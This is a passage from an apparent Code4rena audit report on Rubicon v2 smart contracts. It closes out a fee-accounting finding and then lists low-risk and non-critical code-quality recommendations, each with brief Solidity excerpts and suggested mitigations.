            ERC20(_asset),
            ERC20(_quote),
            _maxFill.sub(_fee)
        );
        
        IERC20(_quote).approve(address(rubiconMarket), _maxFill);

        rubiconMarket.buyAllAmount(
            ERC20(_asset),
            _buyAmount,
            ERC20(_quote),
            _maxFill
        );
    }
```

```solidity
  function _marketSell(
        address _asset,
        address _quote,
        uint256 _minFill
    ) internal {
        // @audit fee?
        uint256 _feeBPS = rubiconMarket.getFeeBPS();
        uint256 _fee = _minFill.mul(_feeBPS).div(10000);
        uint256 _payAmount = rubiconMarket.getPayAmount(
            ERC20(_asset),
            ERC20(_quote),
            _minFill.add(_fee)
        );
        // @audit doesnt account for maker fee

        // Add the BASE fee to the amount to be paid


        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));

        /// @dev recalculate fee in _asset form
        _fee = _payAmount.mul(_feeBPS).div(10000);

        if (_assetBalance < _payAmount) {
            IERC20(_asset).transferFrom(
                msg.sender,
                address(this),
                _payAmount.sub(_assetBalance).add(_fee) // transfer fee
            );
        }
```

As discussed with the sponsor, the proper approach for v2 trades is *do not account for the fee*. Instead, it should be taken from the input amount, unlike in v1 (where it was needed for the input amount to have some addition to paying the fee).

So basically, this fee calculation in `Position` is useless for v2, and that's an issue.

### Recommended Mitigation Steps

Remove all fee calculations from the `_marketBuy` and `_marketSell` functions in `Position.sol`. As per the discussion with the sponsor, fees should not be accounted for in these functions for v2 trades.

**[daoio (Rubicon) confirmed via duplicate issue #1149](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1149#issuecomment-1532808491)**


**[HickupHH3 (judge) decreased severity to Medium commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/282#issuecomment-1565169848):**
 > > As discussed with the sponsor, the proper approach for v2 trades is do not account for the fee. Instead, it should be taken from the input amount, unlike in v1 (where it was needed for the input amount to have some addition to paying the fee).
> 
> I agree that this should be the approach, but because the fee accounting in `RubiconMarket` has so many errors, I'm unsure what the expected behaviour looks like (should input amounts, `min_fill_amt` be inclusive or exclusive of fees?). This also affects how I should be de duping the issues as there is some overlap here and there.
> 
> [#1149](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1149) and [#1206](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1206) fall under this purview of accounting for fees where it shouldn't be happening (double counting), and that's why I grouped them together.

***

# Low Risk and Non-Critical Issues

For this audit, 29 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-04-rubicon-findings/issues/254) by **catellatech** received the top score from the judge.

*The following wardens also submitted reports: [brgltd](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1373), 
[adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1325), 
[cducrest](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1275), 
[immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1231), 
[lukris02](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1215), 
[tnevler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1133), 
[favelanky](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1072), 
[Walter](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1014), 
[xmxanuel](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1008), 
[0xAgro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/962), 
[peanuts](https://github.com/code-423n4/2023-04-rubicon-findings/issues/954), 
[Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/931), 
[ast3ros](https://github.com/code-423n4/2023-04-rubicon-findings/issues/823), 
[oualidpro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/810), 
[thekmj](https://github.com/code-423n4/2023-04-rubicon-findings/issues/757), 
[Madalad](https://github.com/code-423n4/2023-04-rubicon-findings/issues/748), 
[CodeFoxInc](https://github.com/code-423n4/2023-04-rubicon-findings/issues/657), 
[DijkstraDev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/520), 
[0xnev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/474), 
[matrix\_0wl](https://github.com/code-423n4/2023-04-rubicon-findings/issues/466), 
[ro1sharkm](https://github.com/code-423n4/2023-04-rubicon-findings/issues/445), 
[0x6980](https://github.com/code-423n4/2023-04-rubicon-findings/issues/434), 
[MalfurionWhitehat](https://github.com/code-423n4/2023-04-rubicon-findings/issues/370), 
[0xSmartContract](https://github.com/code-423n4/2023-04-rubicon-findings/issues/365), 
[Kaysoft](https://github.com/code-423n4/2023-04-rubicon-findings/issues/256), 
[0xmichalis](https://github.com/code-423n4/2023-04-rubicon-findings/issues/207), 
[Sathish9098](https://github.com/code-423n4/2023-04-rubicon-findings/issues/63) and 
[Rolezn](https://github.com/code-423n4/2023-04-rubicon-findings/issues/52).*

Dear Rubicon v2 Team, as we have gone through each contract within the scope, we have noticed good practices that have been implemented. However, we have identified some inconsistencies that we recommend addressing. We understand that every team has a different level of good practices, but we believe that at least 90% of the recommendations in the following report should be applied for better gas efficiency, readability, and most importantly, safety.

*Note: We have provided a description of the situation and recommendations to follow, including articles and resources we have created to help identify the problem and address it quickly, and to implement them in future projects.*

## Low Risk Summary
| Count | Explanation | Instances |
|:--:|:-------|:--:|
| [L&#8209;01] | CRITICAL CHANGES SHOULD USE TWO-STEP PROCEDURE | 1 |
| [L&#8209;02] | ADD A TIMELOCK TO CRITICAL FUNCTIONS | 3 |
| [L&#8209;03] | IN THE EVENTS, INCLUDE THE OLD AND NEW VALUES OF THE UPDATED PARAMETERS TO TRACK THE CHANGES MADE  | 3 |
| [L&#8209;04] | MISSING EVENTS FOR ONLY FUNCTIONS THAT CHANGE CRITICAL PARAMETERS | 3 |
| [L&#8209;5] | UPGRADEABLE CONTRACT IS MISSING A `__GAP[50]` STORAGE VARIABLE | 1 |
| [L&#8209;06] | ADD CONSTRUCTOR INITIALIZERS | 2 |
| [L&#8209;07] | THE CONTRACT IMPORTS A LIBRARY THAT IT DOES NOT USE, BUT SHOULD | 1 |
| [L&#8209;08] | USE `increaseAllowance` INSTEAD OF THE FUNCTION `approve` | 1 |
| [L&#8209;09] | DID NOT APPROVE TO ZERO FIRST | 1 |
| [L&#8209;10] | INCONSISTENT SOLIDITY PRAGMA |  |
| [L&#8209;11] | PREVENT DIV BY 0 |  |
| [L&#8209;12] | MISSING EMERGENCY STOP (CIRCUIT BREAKER) PATTERN | 2 |

## Non-Critical Summary
| Count | Explanation | Instances |
|:--:|:-------|:--:|
| [N&#8209;01] | USE OF FLOATING PRAGMA | 1 |
| [N&#8209;02] | USE A MORE RECENT VERSION OF SOLIDITY  | 5 |
| [N&#8209;03] | CREATE YOUR OWN IMPORT NAMES INSTEAD OF USING THE REGULAR ONES | All Contracts |
| [N&#8209;04] | MANDATORY CHECKS FOR EXTRA SAFETY IN THE SETTERS  | 4 |
| [N&#8209;05] | NATSPEC COMMENTS SHOULD BE INCREASED IN CONTRACTS | 4 |
| [N&#8209;06] | USE A SINGLE FILE FOR ALL SYSTEM-WIDE CONTRACTS/LIBRARY | 4 |
| [N&#8209;07] | LACK OF NATSPEC DOCUMENTATION | All Contracts |
| [N&#8209;08] | USE SCIENTIFIC NOTATION (E.G. 1E18) RATHER THAN EXPONENTIATION (E.G. 10**18) | 11 |
| [N&#8209;09] | REMOVE THE COMMENTED CODE FROM THE PROJECT | 2 |
| [N&#8209;10] | NATSPEC DONT COMPLY WITH SOLDITY STYLE GUIDE | 1 |
| [N&#8209;11] | FUNCTION WRITING THAT DOES NOT COMPLY WITH THE SOLIDITY STYLE GUIDE | All Contracts |
| [N&#8209;12] | NON-LIBRARY/INTERFACE FILES SHOULD USE FIXED COMPILER VERSIONS, NOT FLOATING ONES | All Contracts |
| [N&#8209;13] | NEED FUZZING TEST | All Contracts |
| [N&#8209;14] | SORT SOLIDITY OPERATIONS USING SHORT-CIRCUIT MODE | 12 |
| [N&#8209;15] | USE OF `BYTES.CONCAT()` INSTEAD OF `ABI.ENCODEPACKED()` | 6 |
| [N&#8209;16] | ASSEMBLY CODES SPECIFIC - SHOULD HAVE COMMENTS | 2 |
| [N&#8209;17] | FUNCTION OVERLOADING | 4 |
| [N&#8209;18] | USING WHILE FOR UNBOUNDED LOOPS ISN'T RECOMMENDED | 11 |
| [N&#8209;19] | TOKENS ACCIDENTALLY SENT TO THE CONTRACT CANNOT BE RECOVERED | 2 |
| [N&#8209;20] | CONTRACT DOES NOT FOLLOW THE SOLIDITY STYLE GUIDE'S SUGGESTED LAYOUT ORDERING | 1 |

## Refactor Issues Summary
| Count | Explanation | Instances |
|:--:|:-------|:--:|
| [R&#8209;01] | FUNCTION NAMING SUGGESTIONS | 2 |
| [R&#8209;02] | SOME NUMBER VALUES CAN BE REFACTORED WITH `_` | 2 |

## Suggestion Details Summary
| Count | Explanation | 
|:--:|:-------|
| [S&#8209;01] | WE SUGGEST USING THE OPENZEPPELIN SAFECAST LIBRARY |  |
| [S&#8209;02] | WE SUGGEST USING THE OPENZEPPELIN ADDRESS LIBRARY |  |
| [S&#8209;03] | WE SUGGEST USING THE BoringERC20 LIBRARY |  | 
| [S&#8209;04] | WE SUGGEST USING A MORE RECENT SOLIDITY PRAGMA TO TAKE ADVANTAGE |  | 

***

## [L-01] CRITICAL CHANGES SHOULD USE TWO-STEP PROCEDURE
Handle ownership transfers with two steps and two transactions. First, allow the current owner to propose a new owner address. Second, allow the proposed owner (and only the proposed owner) to accept ownership, and update the contract owner internally.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
25: function setOwner(address owner_) external auth {
        owner = owner_;
        emit LogSetOwner(owner);
    }
```
### MITIGATION
Implement zero address check and consider implementing a two step process where the owner nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.

## [L-02] ADD A TIMELOCK TO CRITICAL FUNCTIONS
It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required; thus, decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user). Consider adding a timelock to the following functions:

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
25:   function setOwner
955:  function setMinSell

contracts/utilities/poolsUtility/Position.sol
226:  function increaseMargin
```

## [L-03] IN THE EVENTS, INCLUDE THE OLD AND NEW VALUES OF THE UPDATED PARAMETERS TO TRACK THE CHANGES MADE
The following functions `RubiconMarket.setOwner`, `RubiconMarket.setMinSell`, and `Position.increaseMargin` make critical changes and should include the `old and new values` of the updated parameters so that users can be aware of the changes made.

## [L-04] MISSING EVENTS FOR ONLY FUNCTIONS THAT CHANGE CRITICAL PARAMETERS
The `afunctions` that change critical parameters should emit events. Events allow capturing of the changed parameters so that off-chain tools/interfaces can register such changes with timelocks. This allows users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.

Missing events and timelocks do not promote transparency and if such changes immediately affect users' perception of fairness or trustworthiness. They could exit the protocol causing a reduction in liquidity, which could negatively impact protocol TVL and reputation.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
1466: function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool)
1471: function setMakerFee(uint256 _newMakerFee) external auth returns (bool) 
1476: function setFeeTo(address newFeeTo) external auth returns (bool)

// @audit the same issue in BathHouseV2 the contract in the L32
32:  function initialize(address _comptroller, address _pAdmin) external // @audit this function should have a event
```
### MITIGATION
Add Event-Emit, for example, in these cases:
```
+ emit SomeEvent(oldFeeTo, newFeeTo);
```

## [L-05] UPGRADEABLE CONTRACT IS MISSING A `__GAP[50]` STORAGE VARIABLE
Reference: [Storage_gaps](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)

You may notice that every contract includes a state variable named `__gap`. This is an empty reserved space in storage that is put in place in Upgradeable contracts. It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments.

A storage gap occurs when a contract is updated and state variables are added or removed. If the position of these variables changes in the new contract, the information that was already stored on the blockchain in the previous position may be exposed and manipulated by an attacker.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol

674: contract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote{
    function initialize(address _feeTo) public {}
}

contracts/BathHouseV2.sol
12: contract BathHouseV2{
    function initialize(address _comptroller, address _pAdmin) external {}
}
```

### MITIGATION
Please remember that smart contracts are immutable. You are following an upgradable contract architecture, so it is essential to implement the GAP mechanism in these contracts and maintain order for future upgrades to avoid compromising users' funds and introducing vulnerabilities in the future.

Consider defining an appropriate storage gap in each upgradeable parent contract at the end of all the storage variable definitions as follows:

```solidity
uint256[50] __gap; // gap to reserve storage in the contract for future variable additions
```

## [L-06] ADD CONSTRUCTOR INITIALIZERS
According to [OpenZeppelin's (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), it is recommended to make it impossible for anyone to execute the "initialize" function on an implementation contract by adding an empty constructor with the "initializer" modifier. This way, the implementation contract is automatically initialized upon deployment.

It's worth nothing that this approach has also been incorporated into the [OZ Wizard](https://wizard.openzeppelin.com/) since the discovery of the UUPS vulnerability. In fact, the code generated by [Wizard 19](https://wizard.openzeppelin.com/) has been modified to include a constructor that automatically initializes the implementation upon deployment.

This practice also helps prevent possible attacks in which someone tries to perform an initialization transaction before the creator of the contract, which could compromise the security of the contract.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
674: contract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote{
    ..........................................................
    700: function initialize(address _feeTo) public{}
}

contracts/BathHouseV2.sol
12: contract BathHouseV2
    .............................
    32: function initialize(address _comptroller, address _pAdmin) external {
}
```

## [L-07] THE CONTRACT IMPORTS A LIBRARY THAT IT DOES NOT USE, BUT SHOULD
The `V2Migrator` contract, on line 4, imports the `SafeERC20` library from OpenZeppelin but does not use it. According to a comment on line 29, every pool in V1 that wants to migrate to V2 should be able to do so with the `migrate` function. In the same comment, they refer to USDC, which, for example, does not follow the ERC20 standard, and many other tokens don't either. You guys should implement the `SafeERC20` library from OZ in this contract.

### PROOF OF CONCEPT
```solidity
// @audit implement this library in the migrate function
4: import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
```
### MITIGATION
Implement the `SafeERC20` library from OpenZepplin in the `V2Migrator.sol` contract.

## [L-08] USE `increaseAllowance` INSTEAD OF THE FUNCTION `approve`
Use `increaseAllowance` instead of the `approve` function since this is an alternative to approve that can be used as a mitigation for problems described in `IERC20-approve`.

### PROOF OF CONCEPT
```solidity
/// OpenZeppelin docs
/** 
* This is an alternative to {approve} that can be used as a mitigation for
* problems described in {IERC20-approve}.
*
*/
contracts/V2Migrator.sol
// @audit use `increaseAllowance`
53: underlying.approve(bathTokenV2, amountWithdrawn);
```
### MITIGATION
Use `increaseAllowance` instead of the `approve` function from OpenZepplin in the `V2Migrator.sol` contract.

## [L-09] DID NOT APPROVE TO ZERO FIRST
Some tokens like USDT do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.

### PROOF OF CONCEPT
```solidity
contracts/V2Migrator.sol
53: underlying.approve(bathTokenV2, amountWithdrawn);
```

A number of features within the vaults will not work if the approve function reverts.

### MITIGATION
It is recommended to set the allowance to zero before increasing the allowance and use `safeIncreaseAllowance`.

## [L-10] INCONSISTENT SOLIDITY PRAGMA
The source files have different solidity compiler ranges referenced. This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file. It also greatly increases the cost of maintenance, as different compiler versions have different semantics and behavior.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
2: pragma solidity ^0.8.9;

contracts/BathHouseV2.sol
2: pragma solidity 0.8.17; // @audit this an another three contract have this pragma version 

contracts/periphery/BathBuddy.sol
2: pragma solidity ^0.8.0;
```
### MITIGATION
We recommend to fix a definite compiler range that is consistent between contracts and upgrade any affected contracts to conform to the specified compiler.

## [L-11] PREVENT DIV BY 0
On several locations in the code, precautions are not being taken for not dividing by 0; this will revert the code. These functions can be called with 0 value in the input; this value is not checked for being bigger than 0, which means, in some scenarios, this can potentially trigger a division by zero.

### PROOF OF CONCEPT
```solidity
contracts/utilities/FeeWrapper.sol
41: fees[i] = (tokenAmounts[i] * feeValue) / feeType;
```
### MITIGATION
We recommend making sure division by 0 won’t occur by checking the variables beforehand and handling this edge case.

## [L-12] MISSING EMERGENCY STOP (CIRCUIT BREAKER) PATTERN
At the start of the project, the system may need to be stopped or upgraded. I suggest you have a script beforehand and add it to the documentation. This can also be called an `EMERGENCY STOP (CIRCUIT BREAKER) PATTERN`. Use the following example to implement it into in the `BathHouseV2.sol`, `claimRewards` function and `RubiconMarket.sol` in the following functions: `sellAllAmount`, `buyAllAmount`.

[Emergency Stop Pattern Example](https://github.com/maxwoe/solidity_patterns/blob/master/security/EmergencyStop.sol)


## [N-01] USE OF FLOATING PRAGMA 
It is advisable to avoid using floating pragmas in contracts that are not libraries.

While floating pragmas make sense in the context of libraries, allowing them to be included in multiple different versions of applications, they can pose a security risk in application implementations.

There is a possibility that a vulnerable compiler version may be accidentally selected or security tools may fallback to an older compiler version, resulting in verification of a different EVM compilation that is ultimately deployed on the blockchain.

Therefore, it is recommended to pin to a specific compiler version to ensure the security of the contract.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
2: pragma solidity ^0.8.9;
```
### MITIGATION
We recommend following your own best practice patterns in `RubiconMarket.sol`, as they do in `BathHouseV2.sol` and the rest of contracts, for interfaces and contracts.

```diff
contracts/RubiconMarket.sol
- 2: pragma solidity ^0.8.9;
+ 2: pragma solidity 0.8.9;
```

## [N-02] USE A MORE RECENT VERSION OF SOLIDITY
It is recommended to update the version of Solidity being used, as an old version is currently in use. It is advisable to consider using the latest version, `0.8.19`. You can check the improvements and bug fixes offered by the new versions [here](https://github.com/ethereum/solidity/blob/develop/Changelog.md)

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
2: pragma solidity ^0.8.9;

contracts/BathHouseV2.sol
2: pragma solidity 0.8.17;

contracts/V2Migrator.sol
2: pragma solidity 0.8.17;

contracts/utilities/poolsUtility/Position.sol
2: pragma solidity 0.8.17;

contracts/utilities/FeeWrapper.sol
2: pragma solidity 0.8.17;
```

### RECOMMENDATION
```diff
contracts/RubiconMarket.sol
- 2: pragma solidity ^0.8.9;
+ 2: pragma solidity 0.8.19;

contracts/BathHouseV2.sol
- 2: pragma solidity 0.8.17;
+ 2: pragma solidity 0.8.19;
```

## [N-03] CREATE YOUR OWN IMPORT NAMES INSTEAD OF USING THE REGULAR ONES
To improve code readability, it is recommended to use specific names when importing instead of regular ones. 

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
11: import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
12: import "@openzeppelin/contracts/utils/StorageSlot.sol";

contracts/BathHouseV2.sol
4: import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
5: import "./compound-v2-fork/InterestRateModel.sol";
6: import "./compound-v2-fork/CErc20Delegator.sol";
7: import "./compound-v2-fork/Comptroller.sol";
8: import "./compound-v2-fork/Unitroller.sol";
9: import "./periphery/BathBuddy.sol";

contracts/V2Migrator.sol
4: import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
5: import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
6: import "./compound-v2-fork/CTokenInterfaces.sol";

contracts/utilities/poolsUtility/Position.sol
4: import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
5: import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
6: import "@openzeppelin/contracts/utils/math/SafeMath.sol";
7: import "@openzeppelin/contracts/access/Ownable.sol";
8: import "../../compound-v2-fork/Comptroller.sol";
9: import "../../compound-v2-fork/PriceOracle.sol";
10: import "../../BathHouseV2.sol";
11: import "../../RubiconMarket.sol";

contracts/utilities/FeeWrapper.sol
4: import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
5: import "./RubiconRouter.sol";
```
### RECOMMENDATION
```diff
-11: import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+11: import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
```

## [N-04] MANDATORY CHECKS FOR EXTRA SAFETY IN THE SETTERS
In the folowing functions below, there are some checks that can be made in order to achieve more safe and efficient code.

Address zero check can be added in the function offer, `RubiconMarket` contract to ensure the address owner and recipient aren't `address(0)`.

### PROOF OF CONCEPT
```solidity
25:     function setOwner(address owner_) external auth {
            owner = owner_; // @audit Check owner_ it's not address 0
            emit LogSetOwner(owner);
        }
        
511:    function offer(
            uint256 pay_amt,
            ERC20 pay_gem,
            uint256 buy_amt,
            ERC20 buy_gem,
            address owner,  // @audit Check that it's not address 0
            address recipient // @audit Check that it's not address 0
        )
         
802:    function offer(
            uint256 pay_amt, //maker (ask) sell how much
            ERC20 pay_gem, //maker (ask) sell which token
            uint256 buy_amt, //maker (ask) buy how much
            ERC20 buy_gem, //maker (ask) buy which token
            uint256 pos, //position to insert offer, 0 should be used if unknown
            address owner,  // @audit Check that it's not address 0
            address recipient // @audit Check that it's not address 0
        )

// @audit also the same issue in the BathHouseV2 contract in the line 32
32: function initialize(address _comptroller, address _pAdmin) external                
```

## [N-05] NATSPEC COMMENTS SHOULD BE INCREASED IN CONTRACTS
It is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI), as it is clearly stated in the [Solidity official documentation](https://docs.soliditylang.org/en/v0.8.15/natspec-format.html). In complex projects such as Defi, the interpretation of all functions and their arguments and returns is important for code readability and auditability. 

### MITIGATION
NatSpec comments should be increased in contracts

## [N-06] USE A SINGLE FILE FOR ALL SYSTEM-WIDE CONTRACTS/LIBRARY
In the main contract `RubiconMarket.sol`, there are many `contracts/libraries` used in the system. It is recommended to put the most used ones in one file (for example `SafeMath.sol`, `DSAuth.sol`, `Events.sol`) and use inheritance to access these values.

This helps with readability and easier maintenance for future changes. It also helps with any issues, as some of these hard-coded contracts are admin contracts.

`SafeMath.sol`, `DSAuth.sol`, `Events.sol` Use and import these files in contracts that require access to these values. This is just a suggestion, in some use cases this may result in higher gas usage in the distribution.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
// @audit Create a specific file for these cases and use inheritance.
    
 /// @notice DSAuth events for authentication schema
 15: contract DSAuthEvents {}

 /// @notice DSAuth library for setting owner of the contract
 /// @dev Provides the auth modifier for authenticated function calls
 22:contract DSAuth is DSAuthEvents {}
 
 /// @notice DSMath library for safe math without integer overflow/underflow
 44: contract DSMath {}

 /// @notice Events contract for logging trade activity on Rubicon Market
 /// @dev Provides the key event logs that are used in all core functionality of exchanging on the Rubicon Market
 94: contract EventfulMarket {}
```
### RECOMMENDATION
We strongly recommend implementing each contract in a separate file. This will help you avoid errors and confusion in your project, and maintain a more organized and readable code structure. Following these good programming and organizational practices will help you build a solid and scalable project, which will be easier to maintain and update in the future.

## [N-07] LACK OF NATSPEC DOCUMENTATION
During the smart contract audit, the absence of Natspec documentation has been detected in several critical functions. It is important to note that this lack of description makes it difficult to understand the functionality of the code and therefore may increase the risk of errors in the future. It is strongly recommended to include detailed documentation in all contract functions to ensure long-term readability and maintainability.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
// @audit Make sure to implement Natspec documentation in critical functions.

    function kill(bytes32 id) external virtual {
        require(cancel(uint256(id)));
    }

    function make(
        ERC20 pay_gem,
        ERC20 buy_gem,
        uint128 pay_amt,
        uint128 buy_amt
    ) external virtual returns (bytes32 id) {
        return
            bytes32(
                offer(
                    pay_amt,
                    pay_gem,
                    buy_amt,
                    buy_gem,
                    msg.sender,
                    msg.sender
                )
            );
    }

    function take(bytes32 id, uint128 maxTakeAmount) external virtual {
        require(buy(uint256(id), maxTakeAmount));
    }

    function _next_id() internal returns (uint256) {
        last_offer_id++;
        return last_offer_id;
    }

    function calcAmountAfterFee(
        uint256 amount
    ) public view returns (uint256 _amount) {
        require(amount > 0);
        _amount = amount;
        _amount -= mul(amount, feeBPS) / 100_000;

        if (makerFee() > 0) {
            _amount -= mul(amount, makerFee()) / 100_000;
        }
    }

    function make(
        ERC20 pay_gem,
        ERC20 buy_gem,
        uint128 pay_amt,
        uint128 buy_amt
    ) public override returns (bytes32) {
        return
            bytes32(
                offer(
                    pay_amt,
                    pay_gem,
                    buy_amt,
                    buy_gem,
                    msg.sender,
                    msg.sender
                )
            );
    }

    function take(bytes32 id, uint128 maxTakeAmount) public override {
        require(buy(uint256(id), maxTakeAmount));
    }

    function kill(bytes32 id) external override {
        require(cancel(uint256(id)));
    }
```
### RECOMMENDATION
Implement the [NatSpec Format](https://docs.soliditylang.org/en/v0.8.19/natspec-format.html) of Solidity.
```solidity
/// @notice Calculate tree age in years, rounded up, for live trees
/// @dev The Alexandr N. Tetearing algorithm could increase precision
/// @param rings The number of rings from dendrochronological sample
/// @return Age in years, rounded up for partial years
```

## [N-08] USE SCIENTIFIC NOTATION (E.G. 1E18) RATHER THAN EXPONENTIATION (E.G. 10**18)
Scientific notation `(e.g. 1E18)` is clearer and easier to read than exponentiation `(e.g. 10**18)`. Additionally, scientific notation is widely used in the Ethereum development community and is considered a best practice for making code more readable and understandable.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
// @audit Refactorize scientific notation
    74: uint256 constant WAD = 10 ** 18;
    75: uint256 constant RAY = 10 ** 27; 
    1059: / 10 ** 9;
    1099: mul(buy_amt, 10 ** 9)
    1101: / 10 ** 9
    1142: mul(pay_amt, 10 ** 9)
    1144: / 10 ** 9
    1175: mul(buy_amt, 10 ** 9)
    1177: / 10 ** 9

contracts/utilities/poolsUtility/Position.sol
317: _max = (_liq.mul(10 ** 18)).div(_price);
331: .div(10 ** 18);
```
### RECOMMENDATION
```diff
-74: uint256 constant WAD = 10 ** 18;
+74: uint256 constant WAD = 1e18; 
```
## [N-09] REMOVE THE COMMENTED CODE FROM THE PROJECT
Smart contracts often contain numerous implemented code fragments. It is advisable to consider removing unnecessary code or implementing it correctly before deploying to the main network. The presence of inconsistent code makes the project difficult to read and can lead to serious errors. Therefore, it is recommended to carefully review the code and make necessary adjustments to ensure quality and security before deploying to the main network.

### PROOF OF CONCEPT
Remove commented code 
[File RubiconMarket.sol](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol)

## [N-10] NATSPEC DONT COMPLY WITH SOLDITY STYLE GUIDE
While auditing, it was noticed that the recommended Solidity standards for Natspec were not being followed correctly.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
// @audit so many instances with these issues
250: // /// @notice Modifier that checks the user to make sure they own the offer and its valid before they attempt to cancel it
666: /// event LogInsert(address keeper, uint256 id);
718: // // After close, anyone can cancel an offer
```
### MITIGATION
Implement the [NatSpec Format](https://docs.soliditylang.org/en/v0.8.19/natspec-format.html) of Solidity.

## [N-11] FUNCTION WRITING THAT DOES NOT COMPLY WITH THE SOLIDITY STYLE GUIDE
According to the Solidity style guide, functions should be laid out in the following order: 

- `constructor()` 
- `receive()` 
- `fallback()` 
- external
- public 
- internal 
- private

[Solidity Order Functions](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions)

Functions should be grouped according to their visibility and ordered: `within a grouping, place the view and pure functions last`

## [N-12] NON-LIBRARY/INTERFACE FILES SHOULD USE FIXED COMPILER VERSIONS, NOT FLOATING ONES
Avoid floating pragmas for non-library contracts.

While floating pragmas makes sense for libraries to allow them to be included with multiple different versions of applications, it may be a security risk for application implementations.

A known vulnerable compiler version may accidentally be selected or security tools might fall-back to an older compiler version ending up checking a different EVM compilation that is ultimately deployed on the blockchain.

It is recommended to pin to a concrete compiler version.

### MITIGATION
```diff
staking/NeoTokyoStaker.sol#L1517-L1521
- pragma solidity ^0.8.9;
+ pragma solidity 0.8.9;
```

## [N-13] NEED FUZZING TEST
We recommend the use of fuzzing tests, especially in finance oriented protocols, due to the complexity and risk involved in handling large amounts of money in these smart contracts. Finance oriented contracts are critical in terms of security and accuracy, as any errors or vulnerabilities could be exploited by malicious attackers to steal funds or cause significant damage. 

Fuzzing tests are an important tool for identifying possible vulnerabilities in the code through the automatic and random generation of input data in the contract, which can help avoid costly errors in production. 

### RECOMMENDATION 
Use should fuzzing test like Echidna or [Foundry](https://book.getfoundry.sh/forge/fuzz-testing).

## [N-14] SORT SOLIDITY OPERATIONS USING SHORT-CIRCUIT MODE
Short-circuiting is a solidity contract development model that uses `OR/AND` logic to sequence different cost operations. It puts low gas cost operations in the front and high gas cost operations in the back, so that if the front is low If the cost operation is feasible, you can skip (short-circuit) the subsequent high-cost Ethereum virtual machine operation.

```solidity
//f(x) is a low gas cost operation 
//g(y) is a high gas cost operation 

//Sort operations with different gas costs as follows 
f(x) || g(y) 
f(x) && g(y)
```

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
325:    if (
            quantity == 0 ||
            spend == 0 ||
            quantity > _offer.pay_amt ||
            spend > _offer.buy_amt
        )
349:    if (_offer.owner == address(0) && getRecipient(id) != address(0))
1197:   if (
            isActive(id) &&
            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]
        )
1217:   while (top != 0 && _isPricedLtOrEq(id, top))
1229:   while (pos != 0 && !isActive(pos))
1244:   while (pos != 0 && _isPricedLtOrEq(id, pos))
1252:   while (pos != 0 && !_isPricedLtOrEq(id, pos))                
1319:   if (t_pay_amt == 0 || t_buy_amt == 0)
1324:   if (
            t_buy_amt > 0 &&
            t_pay_amt > 0 &&
            t_pay_amt >= _dust[address(t_pay_gem)]
        )
1452:   while (uid > 0 && uid != id)  

contracts/utilities/poolsUtility/Position.sol

176:    if (i.add(1) == vars.limit && vars.lastBorrow != 0)
391:    if (
